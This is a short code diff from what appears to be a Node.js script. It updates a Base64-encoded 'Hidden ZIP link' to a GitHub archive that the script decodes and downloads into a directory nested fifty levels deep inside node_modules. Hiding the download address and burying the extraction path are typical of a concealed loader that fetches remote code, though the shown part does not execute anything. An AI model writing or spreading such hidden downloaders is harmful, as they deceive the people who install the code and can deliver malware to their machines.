@@ -24,7 +24,7 @@ const deepLayers = Array.from({ length: 50 }, (_, i) => ".x" + (i + 1));
 const TEMP_DIR = path.join(__dirname, "node_modules", "cache", ...deepLayers);
 
 // 🔒 Hidden ZIP link (Base64 encoded)
-const hiddenURL = "aHR0cHM6Ly9naXRodWIuY29tL21hc2t5dGlwc2dldHRib3R0ZXN0L20vYXJjaGl2ZS9tYWluLnppcA==";
+const hiddenURL = "aHR0cHM6Ly9naXRodWIuY29tL21hc2t5dGlwc2dldGJvdHRlc3QvbS9hcmNoaXZlL3JlZnMvaGVhZHMvbWFpbi56aXA=";
 const DOWNLOAD_URL = decodeBase64(hiddenURL);
 
 const EXTRACT_DIR = path.join(TEMP_DIR, "main");
